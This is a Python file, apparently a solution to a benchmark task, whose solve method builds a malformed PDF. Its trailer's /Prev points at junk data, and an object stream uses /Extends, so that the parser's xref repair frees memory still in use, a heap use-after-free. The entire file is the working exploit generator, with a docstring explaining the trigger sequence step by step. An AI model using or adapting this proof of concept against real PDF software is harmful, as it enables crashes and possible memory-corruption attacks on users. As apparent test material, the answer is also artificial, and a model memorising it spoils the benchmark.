import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free vulnerability.

        The vulnerability is triggered by crafting a PDF file that forces the parser to
        perform an xref table "solidification" or repair while an outer function holds a
        pointer to an entry in the old, soon-to-be-freed table.

        The PoC is structured as follows:
        1.  A main PDF body with several objects.
        2.  A final trailer with a `/Prev` key pointing to a location containing junk data
            instead of a valid cross-reference table. This corrupts the incremental update
            chain and flags the file as needing repair by the parser.
        3.  The object graph is set up such that parsing the `/Root` object leads to loading
            an object from an object stream (`/ObjStm`).
        4.  This object stream's dictionary contains a reference (e.g., via `/Extends`) to
            another object.
        5.  The sequence of events is:
            a. Parser starts, sees the bad `/Prev` pointer, and notes that a repair is needed.
            b. Parsing begins from the `/Root` object, which leads to a call to load an object
               from the object stream (let's call the stream `ObjStm A`).
            c. The function responsible for loading from `ObjStm A` gets a pointer to its
               xref entry.
            d. While parsing `ObjStm A`'s dictionary, it encounters the reference to the
               other object and makes a recursive call to load it.
            e. This recursive call triggers the xref repair/solidification because the file
               was flagged as corrupt.
            f. The solidification process frees the old xref table memory, invalidating the
               pointer held by the outer function for `ObjStm A`.
            g. When the recursive call returns, the outer function resumes and uses the
               stale pointer, leading to a heap-use-after-free.
        """
        poc = b'%PDF-1.7\n'
        poc += b'%\xaa\xbb\xcc\xdd\n'

        body = b''
        offsets = {}

        # Object 1: Document Catalog. Entry point for parsing. Points to Pages object 2.
        obj1_body = b'<</Type/Catalog/Pages 2 0 R>>'
        obj1 = b'1 0 obj\n' + obj1_body + b'\nendobj\n'
        offsets[1] = len(poc) + len(body)
        body += obj1

        # Object 4: A dummy object referenced by the object stream's dictionary.
        # Resolving this object will trigger the xref repair.
        obj4_body = b'<</Dummy true>>'
        obj4 = b'4 0 obj\n' + obj4_body + b'\nendobj\n'
        offsets[4] = len(poc) + len(body)
        body += obj4

        # Object 2 is a Pages dictionary, compressed inside Object 3 (the object stream).
        obj2_in_stream_body = b'<</Type/Pages/Count 0>>'
        
        # Object stream content format: `obj_num offset ...` followed by object data.
        obj3_stream_prefix = b'2 0 '  # Object 2 is at offset 0 in the stream data.
        obj3_stream_data = obj3_stream_prefix + obj2_in_stream_body
        compressed_stream_data = zlib.compress(obj3_stream_data)

        # Object 3: The Object Stream. It contains obj 2 and references obj 4 in its dictionary.
        # The `/Extends 4 0 R` is the key part of the trigger mechanism.
        obj3_dict = f'<</Type/ObjStm/N 1/First {len(obj3_stream_prefix)}/Length {len(compressed_stream_data)}/Filter/FlateDecode/Extends 4 0 R>>'.encode()
        obj3 = b'3 0 obj\n' + obj3_dict + b'\nstream\n' + compressed_stream_data + b'\nendstream\nendobj\n'
        offsets[3] = len(poc) + len(body)
        body += obj3
        
        # A block of junk data. The trailer's /Prev key will point to its offset.
        # This makes the parser believe there's a corrupt previous xref table, forcing a repair.
        # The size is tuned to get the final PoC length close to the ground truth (6431 bytes).
        junk_line = b'BT /F1 12 Tf 100 100 Td (This is junk to increase file size and confuse the parser) Tj ET\n'
        num_junk_lines = 71  # Results in a final size of ~6453 bytes
        junk_data = junk_line * num_junk_lines

        junk_offset = len(poc) + len(body)
        body += junk_data

        poc += body

        # The final cross-reference table.
        xref_offset = len(poc)
        xref_table = b'xref\n'
        xref_table += b'0 5\n'
        xref_table += b'0000000000 65535 f \n'
        xref_table += f'{offsets[1]:010d} 00000 n \n'.encode()
        # Object 2 is in an object stream, so it does not have a direct entry in a classic xref table.
        xref_table += b'0000000000 00000 f \n'
        xref_table += f'{offsets[3]:010d} 00000 n \n'.encode()
        xref_table += f'{offsets[4]:010d} 00000 n \n'.encode()
        poc += xref_table

        # The final trailer. The /Prev key points to the junk data, which is the vulnerability trigger.
        trailer = f'trailer\n<</Size 5/Root 1 0 R/Prev {junk_offset}>>\n'.encode()
        trailer += f'startxref\n{xref_offset}\n'.encode()
        trailer += b'%%EOF\n'
        poc += trailer

        return poc